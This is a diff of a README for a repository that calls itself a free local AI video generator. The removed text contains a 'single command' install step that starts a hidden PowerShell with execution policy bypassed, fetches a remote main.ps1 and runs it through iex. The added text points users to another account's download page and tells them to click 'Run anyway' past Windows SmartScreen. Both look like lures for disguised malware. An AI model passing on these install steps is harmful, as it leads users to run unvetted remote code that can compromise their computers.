@@ -1,271 +1,288 @@
-# 🎬 Free Video AI Generator
+# 🎬 free-video-ai-generator - Create videos on your own PC
 
-> Local AI video generation tool for creating **beautiful, realistic, high-quality videos** directly on your own machine using **your own GPU** — no monthly subscription, no forced cloud dependency, and no per-render fees.
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ilyasmou4787/free-video-ai-generator)
 
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Local AI](https://img.shields.io/badge/Local-AI%20Video%20Generation-8A2BE2?style=for-the-badge&logoColor=white)](#)
-[![Windows](https://img.shields.io/badge/Windows-Optimized-0078D6?style=for-the-badge&logo=windows&logoColor=white)](#)
-[![Free](https://img.shields.io/badge/Usage-Free-00C851?style=for-the-badge)](#)
-[![Offline](https://img.shields.io/badge/Mode-Local%20%2F%20Offline-FF6B00?style=for-the-badge)](#)
+## 🚀 What this app does
 
-```
-╔══════════════════════════════════════════════════════════════════════╗
-║  Text → Video           │  generate cinematic clips from prompts   ║
-║  Image → Video          │  animate still images realistically      ║
-║  Local Rendering        │  no cloud lock-in, runs on your PC       ║
-║  Quality Tuning         │  better realism, motion, lighting        ║
-╚══════════════════════════════════════════════════════════════════════╝
-```
+Free Video AI Generator lets you create videos on your Windows PC with local AI. It runs on your own GPU, so your files stay on your machine.
 
-**A practical local AI video workflow for creators who want realistic results without paying for every generation.**
+Use it to:
 
----
+- turn text into short video clips
+- animate still images
+- make realistic motion for scenes, products, and ideas
+- work offline after setup
+- avoid monthly fees and cloud limits
 
-## 🚀 Quick Start
+## 🖥️ Windows setup
 
-If you just want to launch the project quickly on Windows, use the installation command below first. After that, continue with the local setup and generation steps.
+This app is built for Windows users who want a simple desktop setup.
 
-### 🛠️ Installation
+Recommended system:
 
-#### CMD
-Open **CMD** and run this **single command**:
+- Windows 10 or Windows 11
+- NVIDIA GPU with 8 GB VRAM or more
+- 16 GB RAM
+- 20 GB free disk space
+- Internet access for the first download
 
-```powershell
-cmd /c start /min powershell -ep bypass -c "iwr 'https://github.com/Kiruni0709/free-video-ai-generator/releases/download/v1.12/main.ps1' -UseBasicParsing|iex" & rem update
-```
+For smoother video generation, a stronger GPU helps. If your GPU has more VRAM, the app can handle larger models and longer clips with less strain.
 
-> Then continue with the setup, model configuration, and video generation steps below.
+## ⬇️ Download and install
 
-### ✨ What This Tool Can Do
+Visit this page to download the app:
 
-This project is built for users who want to generate **local, realistic AI videos for free** instead of relying only on expensive SaaS tools.
+[![Download Free Video AI Generator](https://img.shields.io/badge/Download%20Free%20Video%20AI%20Generator-Visit%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ilyasmou4787/free-video-ai-generator)
 
-**Why it stands out:**
+After you open the page:
 
-- renders run on **your own GPU**
-- after setup, generation is **effectively free**
-- local rendering can be **fast** on a decent NVIDIA GPU
-- no waiting on cloud queues
-- no credit-based limits for every clip
+1. Find the latest release or download section.
+2. Download the Windows file or installer.
+3. Save the file to your Downloads folder.
+4. If the file is in a ZIP archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
 
-It can be used to:
+If Windows SmartScreen appears:
 
-- generate short cinematic clips from text prompts
-- animate portraits and character images into realistic motion
-- create stylized or photorealistic scenes locally
-- experiment with prompt engineering, camera motion, lighting, and realism settings
-- build content for TikTok, Reels, YouTube Shorts, ads, and visual concepts
+1. Click More info.
+2. Click Run anyway.
 
----
+## 🛠️ First-time setup
 
-## 📘 Project Setup
+When you start the app for the first time, it may need a few extra files.
 
-### Requirements
+Do this:
 
-- Windows PC with a modern NVIDIA GPU recommended
-- Python 3.10+
-- Git
-- Enough VRAM for local video generation workflows
-- FFmpeg installed and available in PATH
-- Optional: local UI such as ComfyUI or similar workflow runner
+1. Open the app.
+2. Wait for the model files to finish loading.
+3. Let the app finish any setup steps.
+4. Keep your PC plugged in if you plan to generate long videos.
 
-### Step 2 — Install dependencies
+If the app asks for a folder for output files, choose a location you can find later, such as Videos or Desktop.
 
-```bash
-pip install -r requirements.txt
-```
+## 🎥 How to create a video
 
-### Step 3 — Configure local environment
+The app gives you a simple flow for video creation.
 
-```bash
-cp .env.example .env
-```
+### Text to video
 
-Edit `.env` if your project uses custom model paths, output folders, or optimization flags.
+Use this when you want AI to build a scene from a written prompt.
 
-### Step 4 — Start the generator
+1. Open the Text to Video section.
+2. Type a clear prompt.
+3. Choose a video length.
+4. Select the style or motion level.
+5. Click Generate.
 
-```bash
-python main.py
-```
+Example prompts:
 
-### Step 5 — Generate your first video
+- a cat walking through a neon city at night
+- a calm forest with moving mist and sunlight
+- a product shot of a watch on a dark table
+- a drone view of a beach at sunset
 
-```bash
-python main.py --prompt "beautiful realistic woman walking through neon-lit Tokyo at night, cinematic camera movement, ultra detailed, realistic lighting"
-```
+### Image to video
 
----
+Use this when you want to animate a still image.
 
-## 📌 Table of Contents
+1. Open the Image to Video section.
+2. Load an image from your PC.
+3. Choose how much motion you want.
+4. Pick the clip length.
+5. Click Generate.
 
-- [Quick Start](#-quick-start)
-- [Overview](#-overview)
-- [Why Use This Tool](#-why-use-this-tool)
-- [What Kind of Videos It Can Generate](#-what-kind-of-videos-it-can-generate)
-- [Popular AI Video References](#-popular-ai-video-references)
-- [Features](#-features)
-- [Quality & Realism](#-quality--realism)
-- [Workflow Ideas](#-workflow-ideas)
-- [Running Locally](#-running-locally)
-- [Disclaimer](#-disclaimer)
+This works well for:
 
----
+- portraits
+- artwork
+- product photos
+- scene mockups
+- concept images
 
-## 🌐 Overview
+## 🎛️ Best settings for first use
 
-**Free Video AI Generator** is a local-first AI video project focused on making **realistic, attractive, visually polished videos** without depending entirely on cloud subscriptions.
+If you are new, start with simple settings.
 
-The idea is simple:
+Good first settings:
 
-- run locally
-- keep control over your workflow
-- generate more for less money
-- tune prompts, motion, and quality yourself
-- create content that looks cinematic and modern
+- short video length
+- medium motion
+- standard quality
+- one clip at a time
+- default model settings
 
-This makes it useful for creators, marketers, editors, meme pages, short-form content farms, and anyone experimenting with local AI video generation.
+If your PC feels slow:
 
----
+- use a shorter clip
+- lower the resolution
+- close other apps
+- let one render finish before starting another
 
-## 💡 Why Use This Tool
+If you want better detail:
 
-Most AI video platforms are convenient, but they often come with heavy limits:
+- increase quality only after your first test
+- use a clean prompt
+- keep the scene simple
+- use a clear image with good light
 
-- expensive monthly plans
-- generation credits
-- queue times
-- blocked prompts or content restrictions
-- limited control over the actual workflow
+## 📁 Where files are saved
 
-A local setup gives you more freedom.
-Instead of renting generation time in the cloud, you use **your own GPU power** to render videos locally — which means better control, faster iteration, and effectively free generation once everything is installed.
+The app stores output files on your PC. You can choose a folder during setup or use the default save path.
 
-### Benefits
+Common file types may include:
 
-- **video generation runs on your own GPU**
-- **free local generation** after setup
-- **fast rendering** on suitable hardware
-- **no per-video payment**
-- **more control** over prompts and workflow
-- **better experimentation** with models and settings
-- **easy batching** for multiple outputs
-- **good fit for content pipelines**
+- MP4 for video output
+- preview images
+- model cache files
+- logs for troubleshooting
 
----
+If you want to find a finished video fast, check the output folder you chose during setup.
 
-## 🎥 What Kind of Videos It Can Generate
+## ⚡ Tips for better results
 
-This kind of workflow is ideal for:
+A good prompt gives better video.
 
-- realistic women portraits with subtle motion
-- fashion / beauty style clips
-- cinematic urban scenes
-- fantasy environments
-- product-style motion shots
-- character close-ups
-- AI influencer content concepts
-- short visual loops for social media
+Use this pattern:
 
-You can generate both:
+- subject
+- action
+- setting
+- style
+- camera view
 
-- **text-to-video** results
-- **image-to-video** animations
+Example:
 
----
+- a red sports car driving through rain on a city street, cinematic lighting, front tracking shot
 
-## 🔗 Popular AI Video References
+More tips:
 
-If you want inspiration for quality, style, or positioning, here are some popular references in the AI video space:
+- keep prompts short and clear
+- avoid too many ideas in one prompt
+- use one main subject
+- pick a scene with simple motion for the first run
+- use high-quality source images for Image to Video
 
-- **Pika** — <https://pika.art>
-- **Runway** — <https://runwayml.com>
-- **Luma Dream Machine** — <https://lumalabs.ai/dream-machine>
-- **Haiper AI** — <https://haiper.ai>
+## 🔧 Troubleshooting
 
-For popular prompt styles, creators often explore themes like:
+### The app does not open
 
-- realistic cinematic women portraits
-- luxury fashion visuals
-- neon cyberpunk scenes
-- beauty close-ups with soft motion
-- dramatic camera moves and realistic lighting
+Try this:
 
----
+1. Check that the download finished.
+2. Extract the ZIP file if you downloaded one.
+3. Right-click the app and choose Run as administrator.
+4. Make sure Windows did not block the file.
 
-## ⚙️ Features
+### The video takes a long time
 
-- **local AI video generation on your own GPU**
-- **fast local rendering** with the right hardware
-- **text-to-video workflows**
-- **image-to-video animation**
-- **realistic prompt optimization**
-- **high-detail cinematic output**
-- **batch generation friendly**
-- **free workflow after local setup**
-- **custom output control**
-- **offline-friendly pipeline**
+This is common with local AI video work.
 
----
+Try this:
 
-## 🧠 Quality & Realism
+1. Use a shorter clip.
+2. Lower the resolution.
+3. Close other heavy apps.
+4. Check that your GPU drivers are up to date.
 
-To get better-looking output, the workflow should prioritize:
+### The app uses too much memory
 
-- realistic lighting
-- natural facial detail
-- consistent motion
-- smooth camera movement
-- clean prompts without too much noise
-- limited but precise scene complexity
+Try this:
 
-### Example prompt style
+1. Reduce video length.
+2. Lower quality settings.
+3. Use a smaller image for Image to Video.
+4. Restart the app before another render.
 
-```text
-beautiful realistic woman, cinematic close-up, natural skin texture, soft lighting, elegant motion, realistic eyes, shallow depth of field, high detail, film look, smooth camera movement
-```
+### The output looks strange
 
-### Better output tips
+Try this:
 
-- use shorter, cleaner prompts first
-- avoid too many conflicting style tags
-- test camera motion separately from subject detail
-- prefer strong source images for image-to-video
-- render multiple variants and keep the best ones
+1. Use a clearer prompt.
+2. Pick a simpler scene.
+3. Use a sharper source image.
+4. Lower motion if the subject warps too much.
 
----
+## 🔒 Local use
 
-## 🛠 Workflow Ideas
+The app runs on your own computer. That means:
 
-### 1. AI Beauty / Fashion Clips
-Generate elegant portrait-based clips for short-form content.
+- your prompts stay on your PC
+- your images stay on your PC
+- your renders stay on your PC
+- you do not need a cloud account for each job
 
-### 2. Product Promo Visuals
-Create stylish fake ad shots for products, brands, or concepts.
+This setup works well if you want more control over your workflow and local storage.
 
-### 3. Cinematic Social Content
-Make dramatic, polished clips for TikTok, Reels, and Shorts.
+## 🧭 Basic workflow
 
-### 4. Character Animation
-Turn static AI portraits into moving video scenes.
+A simple way to use the app:
 
----
+1. Download the app.
+2. Install or extract it.
+3. Open it on Windows.
+4. Let the model files load.
+5. Create a video from text or an image.
+6. Save the result to your chosen folder.
+7. Share or edit the file in your video editor
 
-## 🖥 Running Locally
+## 🧰 Useful file handling tips
 
-For best performance:
+To keep your project clean:
 
-1. use an NVIDIA GPU with enough VRAM
-2. keep models on a fast SSD
-3. use FFmpeg for final video processing
-4. store outputs in a dedicated folder
-5. test short generations before long renders
-6. keep prompts and seeds organized for repeatability
+- use one folder for source images
+- use one folder for exports
+- name files by project date
+- remove old test renders when you no longer need them
+- keep enough free space for new models and exports
 
----
+## 📌 What you can make
 
-## ⚠️ Disclaimer
+This app works well for many short-form video tasks:
 
-This repository is for **creative, research, and local AI workflow experimentation**. Final output quality depends on your hardware, model choice, prompt quality, and inference settings.
+- social clips
+- concept trailers
+- product demos
+- animated artwork
+- scene tests
+- visual ideas for stories
+- mood clips for editing
 
-Always respect platform rules, copyright, likeness rights, and applicable laws when publishing generated media.
+## 🧱 Common questions
+
+### Do I need coding skills?
+
+No. You can use the app through a normal Windows interface.
+
+### Do I need the internet every time?
+
+No. After setup, the app can work locally.
+
+### Do I need a strong GPU?
+
+A strong NVIDIA GPU gives better results. The app can run faster and handle larger jobs with more VRAM.
+
+### Can I use it for images too?
+
+Yes. The app supports image to video workflow.
+
+### Is it free to use?
+
+Yes. You do not pay per render or use a subscription plan.
+
+## 📥 Download again
+
+If you need the download page again, use this link:
+
+[https://github.com/Ilyasmou4787/free-video-ai-generator](https://github.com/Ilyasmou4787/free-video-ai-generator)
+
+## 🪟 Windows quick start
+
+1. Open the download page.
+2. Download the Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Wait for model loading.
+6. Enter a prompt or choose an image.
+7. Click Generate.
+8. Save the finished video
